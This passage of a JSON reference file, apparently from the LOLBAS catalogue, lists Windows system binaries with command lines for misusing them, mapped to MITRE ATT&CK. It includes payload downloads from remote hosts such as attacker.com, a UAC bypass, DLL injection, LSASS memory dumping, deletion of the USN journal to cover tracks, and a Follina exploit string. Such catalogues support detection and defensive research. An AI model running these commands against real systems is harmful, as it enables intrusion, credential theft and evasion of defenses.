            "description": "Selects and executes a command on a file or set of files. This command is useful for batch processing.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes specified command since there is a match for notepad.exe in the c:\\windows\\System32 folder.",
                    "code": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\""
                },
                {
                    "label": "Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\\windows\\system32 folder.",
                    "code": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{PATH_ABSOLUTE}:evil.exe\""
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Fsutil.exe",
            "description": "File System Utility",
            "categories": [
                "tamper",
                "execute"
            ],
            "commands": [
                {
                    "label": "Zero out a file",
                    "code": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}"
                },
                {
                    "label": "Delete the USN journal volume to hide file creation activity",
                    "code": "fsutil.exe usn deletejournal /d c:"
                },
                {
                    "label": "Executes a pre-planted binary named netsh.exe from the current directory.",
                    "code": "fsutil.exe trace decode"
                }
            ],
            "mitre": {
                "technique": "T1485",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1485/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ftp.exe",
            "description": "A binary designed for connecting to FTP servers",
            "categories": [
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Executes the commands you put inside the text file.",
                    "code": "echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt"
                },
                {
                    "label": "Download",
                    "code": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\""
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Gpscript.exe",
            "description": "Used by group policy to process scripts",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes logon scripts configured in Group Policy.",
                    "code": "Gpscript /logon"
                },
                {
                    "label": "Executes startup scripts configured in Group Policy",
                    "code": "Gpscript /startup"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Hh.exe",
            "description": "Binary used for processing chm files in Windows",
            "categories": [
                "download",
                "execute"
            ],
            "commands": [
                {
                    "label": "Open the target batch script with HTML Help.",
                    "code": "HH.exe {REMOTEURL:.bat}"
                },
                {
                    "label": "Executes specified executable with HTML Help.",
                    "code": "HH.exe {PATH_ABSOLUTE:.exe}"
                },
                {
                    "label": "Executes a remote .chm file which can contain commands.",
                    "code": "HH.exe {REMOTEURL:.chm}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "IMEWDBLD.exe",
            "description": "Microsoft IME Open Extended Dictionary Module",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.",
                    "code": "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ie4uinit.exe",
            "description": "Executes commands from a specially prepared ie4uinit.inf file.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes commands from a specially prepared ie4uinit.inf file.",
                    "code": "ie4uinit.exe -BaseSettings"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "iediagcmd.exe",
            "description": "Diagnostics Utility for Internet Explorer",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes binary that is pre-planted at C:\\test\\system32\\netsh.exe.",
                    "code": "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ieexec.exe",
            "description": "The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.",
            "categories": [
                "download",
                "execute"
            ],
            "commands": [
                {
                    "label": "Downloads and executes executable from the remote server.",
                    "code": "ieexec.exe {REMOTEURL:.exe}"
                },
                {
                    "label": "Downloads and executes executable from the remote server.",
                    "code": "ieexec.exe {REMOTEURL:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ilasm.exe",
            "description": "used for compile c# code into dll or exe.",
            "categories": [
                "compile"
            ],
            "commands": [
                {
                    "label": "Binary file used by .NET to compile C#/intermediate (IL) code to .exe",
                    "code": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe"
                },
                {
                    "label": "Binary file used by .NET to compile C#/intermediate (IL) code to dll",
                    "code": "ilasm.exe {PATH_ABSOLUTE:.txt} /dll"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Infdefaultinstall.exe",
            "description": "Binary used to perform installation based on content inside inf files",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.",
                    "code": "InfDefaultInstall.exe {PATH:.inf}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Installutil.exe",
            "description": "The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies",
            "categories": [
                "awl-bypass",
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Execute the target .NET DLL or EXE.",
                    "code": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}"
                },
                {
                    "label": "Execute the target .NET DLL or EXE.",
                    "code": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}"
                },
                {
                    "label": "It will download a remote payload and place it in INetCache.",
                    "code": "InstallUtil.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1218.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "iscsicpl.exe",
            "description": "Microsoft iSCSI Initiator Control Panel tool",
            "categories": [
                "uac-bypass"
            ],
            "commands": [
                {
                    "label": "c:\\windows\\syswow64\\iscsicpl.exe has a DLL injection through `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\WindowsApps\\ISCSIEXE.dll`, resulting in UAC bypass.",
                    "code": "c:\\windows\\syswow64\\iscsicpl.exe"
                },
                {
                    "label": "Both `c:\\windows\\system32\\iscsicpl.exe` and `c:\\windows\\system64\\iscsicpl.exe` have UAC bypass through launching iscicpl.exe, then navigating into the Configuration tab, clicking Report, then launching your custom command.",
                    "code": "iscsicpl.exe"
                }
            ],
            "mitre": {
                "technique": "T1548.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1548.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Jsc.exe",
            "description": "Binary file used by .NET to compile JavaScript code to .exe or .dll format",
            "categories": [
                "compile"
            ],
            "commands": [
                {
                    "label": "Use jsc.exe to compile JavaScript code stored in the provided .JS file and generate a .EXE file with the same name.",
                    "code": "jsc.exe {PATH:.js}"
                },
                {
                    "label": "Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name.",
                    "code": "jsc.exe /t:library {PATH:.js}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ldifde.exe",
            "description": "Creates, modifies, and deletes LDAP directory objects.",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.",
                    "code": "Ldifde -i -f {PATH:.ldf}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Makecab.exe",
            "description": "Binary to package existing files into a cabinet (.cab) file",
            "categories": [
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.",
                    "code": "makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab"
                },
                {
                    "label": "Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.",
                    "code": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab"
                },
                {
                    "label": "Download and compresses the target file and stores it in the target file.",
                    "code": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}"
                },
                {
                    "label": "Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.",
                    "code": "makecab /F {PATH:.ddf}"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Mavinject.exe",
            "description": "Used by App-v in Windows",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Inject evil.dll into a process with PID 3110.",
                    "code": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}"
                },
                {
                    "label": "Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172",
                    "code": "Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll"
                }
            ],
            "mitre": {
                "technique": "T1218.013",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.013/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Microsoft.Workflow.Compiler.exe",
            "description": "A utility included with .NET that is capable of compiling and executing C# or VB.net code.",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Compile and execute C# or VB.net code in a XOML file referenced in the first argument (any extension accepted).",
                    "code": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}"
                },
                {
                    "label": "Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.",
                    "code": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}"
                },
                {
                    "label": "Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.",
                    "code": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Mmc.exe",
            "description": "Load snap-ins to locally and remotely manage Windows systems",
            "categories": [
                "execute",
                "uac-bypass",
                "download"
            ],
            "commands": [
                {
                    "label": "Launch a 'backgrounded' MMC process and invoke a COM payload",
                    "code": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}"
                },
                {
                    "label": "Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC.",
                    "code": "mmc.exe gpedit.msc"
                },
                {
                    "label": "Download and save an executable to disk",
                    "code": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}"
                }
            ],
            "mitre": {
                "technique": "T1218.014",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.014/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "MpCmdRun.exe",
            "description": "Binary part of Windows Defender. Used to manage settings in Windows Defender",
            "categories": [
                "download",
                "execute"
            ],
            "commands": [
                {
                    "label": "Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)",
                    "code": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}"
                },
                {
                    "label": "Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.",
                    "code": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe"
                },
                {
                    "label": "Download file to machine and store it in Alternate Data Stream",
                    "code": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Msbuild.exe",
            "description": "Used to compile and execute code",
            "categories": [
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "Build and execute a C# project stored in the target XML file.",
                    "code": "msbuild.exe {PATH:.xml}"
                },
                {
                    "label": "Build and execute a C# project stored in the target csproj file.",
                    "code": "msbuild.exe {PATH:.csproj}"
                },
                {
                    "label": "Executes generated Logger DLL file with TargetLogger export.",
                    "code": "msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo"
                },
                {
                    "label": "Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+.",
                    "code": "msbuild.exe {PATH:.proj}"
                },
                {
                    "label": "By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line.",
                    "code": "msbuild.exe @{PATH:.rsp}"
                }
            ],
            "mitre": {
                "technique": "T1127.001",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127.001/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Msconfig.exe",
            "description": "MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml.",
                    "code": "Msconfig.exe -5"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Msdt.exe",
            "description": "Microsoft diagnostics tool",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.",
                    "code": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE"
                },
                {
                    "label": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.",
                    "code": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE"
                },
                {
                    "label": "Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.",
                    "code": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\""
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Msedge.exe",
            "description": "Microsoft Edge browser",
            "categories": [
                "download",
                "execute"
            ],
            "commands": [
                {
                    "label": "Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.",
                    "code": "msedge.exe {REMOTEURL:.exe.txt}"
                },
                {
                    "label": "Edge will silently download the file. File extension should be .html and binaries should be encoded.",
                    "code": "msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}"
                },
                {
                    "label": "Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command",
                    "code": "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\""
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Mshta.exe",
            "description": "Used by Windows to execute html applications. (.hta)",
            "categories": [
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.",
                    "code": "mshta.exe {PATH:.hta}"
                },
                {
                    "label": "Executes VBScript supplied as a command line argument.",
                    "code": "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:{REMOTEURL:.sct}\"\")\"))"
                },
                {
                    "label": "Executes JavaScript supplied as a command line argument.",
                    "code": "mshta.exe javascript:a=GetObject(\"script:{REMOTEURL:.sct}\").Exec();close();"
                },
                {
                    "label": "Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.",
                    "code": "mshta.exe \"{PATH_ABSOLUTE}:file.hta\""
                },
                {
                    "label": "It will download a remote payload and place it in INetCache.",
                    "code": "mshta.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1218.005",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.005/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Msiexec.exe",
            "description": "Used by Windows to execute msi files",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Installs the target .MSI file silently.",
                    "code": "msiexec /quiet /i {PATH:.msi}"
                },
                {
                    "label": "Installs the target remote & renamed .MSI file silently.",
                    "code": "msiexec /q /i {REMOTEURL}"
                },
                {
                    "label": "Calls DllRegisterServer to register the target DLL.",
                    "code": "msiexec /y {PATH_ABSOLUTE:.dll}"
                },
                {
                    "label": "Calls DllUnregisterServer to un-register the target DLL.",
                    "code": "msiexec /z {PATH_ABSOLUTE:.dll}"
                },
                {
                    "label": "Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.",
                    "code": "msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb"
                }
            ],
            "mitre": {
                "technique": "T1218.007",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.007/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Netsh.exe",
            "description": "Netsh is a Windows tool used to manipulate network interface settings.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called",
                    "code": "netsh.exe add helper {PATH_ABSOLUTE:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1546.007",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1546.007/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ngen.exe",
            "description": "Microsoft Native Image Generator.",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server using the Microsoft Native Image Generator utility.",
                    "code": "ngen.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Odbcconf.exe",
            "description": "Used in Windows for managing ODBC connections",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute DllRegisterServer from DLL specified.",
                    "code": "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}"
                },
                {
                    "label": "Install a driver and load the DLL. Requires administrator privileges.",
                    "code": "odbcconf INSTALLDRIVER \"lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2\"\nodbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"\n"
                },
                {
                    "label": "Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.",
                    "code": "odbcconf -f {PATH:.rsp}"
                }
            ],
            "mitre": {
                "technique": "T1218.008",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.008/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "OfflineScannerShell.exe",
            "description": "Windows Defender Offline Shell",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute mpclient.dll library in the current working directory",
                    "code": "OfflineScannerShell"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "OneDriveStandaloneUpdater.exe",
            "description": "OneDrive Standalone Updater",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Download a file from the web address specified in `HKCU\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC`. `ODSUUpdateXMLUrlFromOC` and `UpdateXMLUrlFromOC` must be equal to non-empty string values in that same registry key. `UpdateOfficeConfigTimestamp` is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in `%localappdata%\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json`.",
                    "code": "OneDriveStandaloneUpdater"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Pcalua.exe",
            "description": "Program Compatibility Assistant",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Open the target .EXE using the Program Compatibility Assistant.",
                    "code": "pcalua.exe -a {PATH:.exe}"
                },
                {
                    "label": "Open the target .DLL file with the Program Compatibilty Assistant.",
                    "code": "pcalua.exe -a {PATH_SMB:.dll}"
                },
                {
                    "label": "Open the target .CPL file with the Program Compatibility Assistant.",
                    "code": "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Pcwrun.exe",
            "description": "Program Compatibility Wizard",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Open the target .EXE file with the Program Compatibility Wizard.",
                    "code": "Pcwrun.exe {PATH_ABSOLUTE:.exe}"
                },
                {
                    "label": "Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.",
                    "code": "Pcwrun.exe /../../$(calc).exe"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Pktmon.exe",
            "description": "Capture Network Packets on the windows 10 with October 2018 Update or later.",
            "categories": [
                "reconnaissance"
            ],
            "commands": [
                {
                    "label": "Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop",
                    "code": "pktmon.exe start --etw"
                },
                {
                    "label": "Select Desired ports for packet capture",
                    "code": "pktmon.exe filter add -p 445"
                }
            ],
            "mitre": {
                "technique": "T1040",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1040/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Pnputil.exe",
            "description": "Used for installing drivers",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Used for installing drivers",
                    "code": "pnputil.exe -i -a {PATH_ABSOLUTE:.inf}"
                }
            ],
            "mitre": {
                "technique": "T1547",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1547/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Presentationhost.exe",
            "description": "File is used for executing Browser applications",
            "categories": [
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Executes the target XAML Browser Application (XBAP) file",
                    "code": "Presentationhost.exe {PATH_ABSOLUTE:.xbap}"
                },
                {
                    "label": "It will download a remote payload and place it in INetCache.",
                    "code": "Presentationhost.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Print.exe",
            "description": "Used by Windows to send files to the printer",
            "categories": [
                "execute",
                "copy"
            ],
            "commands": [
                {
                    "label": "Copy file.exe into the Alternate Data Stream (ADS) of file.txt.",
                    "code": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}"
                },
                {
                    "label": "Copy file from source to destination",
                    "code": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}"
                },
                {
                    "label": "Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe.",
                    "code": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "PrintBrm.exe",
            "description": "Printer Migration Command-Line Tool",
            "categories": [
                "download",
                "execute"
            ],
            "commands": [
                {
                    "label": "Create a ZIP file from a folder in a remote drive",
                    "code": "PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}"
                },
                {
                    "label": "Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder",
                    "code": "PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Provlaunch.exe",
            "description": "Launcher process",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution.",
                    "code": "provlaunch.exe LOLBin"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Psr.exe",
            "description": "Windows Problem Steps Recorder, used to record screen and clicks.",
            "categories": [
                "reconnaissance"
            ],
            "commands": [
                {
                    "label": "Record a user screen without creating a GUI. You should use \"psr.exe /stop\" to stop recording and create output file.",
                    "code": "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0"
                }
            ],
            "mitre": {
                "technique": "T1113",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1113/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Query.exe",
            "description": "Remote Desktop Services MultiUser Query Utility",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Once executed, `query.exe` will execute `quser.exe` in the same folder. Thus, if `query.exe` is copied to a folder and an arbitrary executable is renamed to `quser.exe`, `query.exe` will spawn it. Instead of `user`, it is also possible to use `session`, `termsession` or `process` as command-line option.",
                    "code": "query.exe user"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Rasautou.exe",
            "description": "Windows Remote Access Dialer",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.",
                    "code": "rasautou -d {PATH:.dll} -p export_name -a a -e e"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "rdrleakdiag.exe",
            "description": "Microsoft Windows resource leak diagnostic tool",
            "categories": [
                "dump"
            ],
            "commands": [
                {
                    "label": "Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).",
                    "code": "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1"
                },
                {
                    "label": "Dump LSASS process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).",
                    "code": "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1"
                },
                {
                    "label": "After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).",
                    "code": "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap"
                }
            ],
            "mitre": {
                "technique": "T1003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Reg.exe",
            "description": "Used to manipulate the registry",
            "categories": [
                "execute",
                "credentials"
            ],
            "commands": [
                {
                    "label": "Export the target Registry key and save it to the specified .REG file within an Alternate data stream.",
